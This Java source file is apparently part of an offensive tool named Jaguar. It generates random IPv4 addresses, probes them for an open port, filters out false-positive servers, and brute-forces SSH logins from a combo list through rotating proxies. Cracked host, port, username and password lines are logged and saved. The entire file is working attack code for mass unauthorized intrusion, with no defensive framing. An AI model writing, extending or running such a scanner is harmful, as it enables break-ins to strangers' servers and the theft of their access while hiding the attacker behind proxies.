package me.aaronakhtar.jaguar.threads;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.ProxyHTTP;
import com.jcraft.jsch.Session;
import me.aaronakhtar.jaguar.Jaguar;
import me.aaronakhtar.jaguar.JaguarUtilFunctions;
import me.aaronakhtar.jaguar.objects.JaguarCombo;
import me.aaronakhtar.jaguar.objects.JaguarProxy;

import javax.print.DocFlavor;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

public class JaguarRandomThread implements Runnable {   // generates random addresses and attempts to bruteforces them.
    private static final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");

    public static final List<String> tried = new ArrayList<>();
    public static volatile int currentSessions = 0;

    private static final Random rand = new Random();
    private static String gen(){
        return rand.nextInt(255) + "." + rand.nextInt(255) + "." + rand.nextInt(255) + "." + rand.nextInt(255);
    }

    @Override
    public void run() {
        while(true){
            final String host = gen();
            if (tried.contains(host)) continue;
            tried.add(host);
            if (JaguarUtilFunctions.checkIfPortIsOpen(host)){
                while(currentSessions == Jaguar.max_concurrent_sessions);
                currentSessions++;
                try {

                    // check if is false pos / one of these weird af ssh servers

                    try{
                        if (JaguarUtilFunctions.attemptBrute(host, new JaguarCombo("randomUsername111110", "passwordIS100%RANDOM"), Jaguar.proxy_list.get(new Random().nextInt(Jaguar.proxy_list.size())))){
                            System.out.println("Target Machine is a false-pos: [thread=" + Thread.currentThread().getName() + "] [host=" + host + ":" + Jaguar.target_port + "]");
                            continue;
                        }
                    }catch (Exception e){
                        if (e.getMessage().contains("refused") || e.getMessage().contains("foreign host") ||
                                e.getMessage().contains("reset") || e.getMessage().contains("reset by peer")) continue;
                    }

                    System.out.println("Attempting to Brute Target Machine: [thread=" + Thread.currentThread().getName() + "] [host=" + host + ":" + Jaguar.target_port + "]");
                    for (JaguarCombo combo : Jaguar.combo_list) {
                        final JaguarProxy jaguarProxy = Jaguar.proxy_list.get(new Random().nextInt(Jaguar.proxy_list.size()));
                        try {
                            System.out.println("Trying Credentials: [thread=" + Thread.currentThread().getName() + "] [combo=" + combo.getUsername() + ":" + combo.getPassword() + "] [host=" + host + ":" + Jaguar.target_port + "]");
                            if (JaguarUtilFunctions.attemptBrute(host, combo, jaguarProxy)){
                                System.out.println("Bruted Target Machine: [thread=" + Thread.currentThread().getName() + "] [host=" + host + ":" + Jaguar.target_port + "] [combo=" + combo.getUsername() + ":" + combo.getPassword() + "] [date=" + sdf.format(new Date()) + "]");
                                JaguarUtilFunctions.save(host + ":" + Jaguar.target_port + ":" + combo.getUsername() + ":" + combo.getPassword());
                                break;
                            }
                        } catch (Exception e) {
                            if (e.getMessage().contains("refused") || e.getMessage().contains("foreign host") ||
                                    e.getMessage().contains("reset") || e.getMessage().contains("reset by peer")) break;
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
                currentSessions--;
            }
        }
    }
}
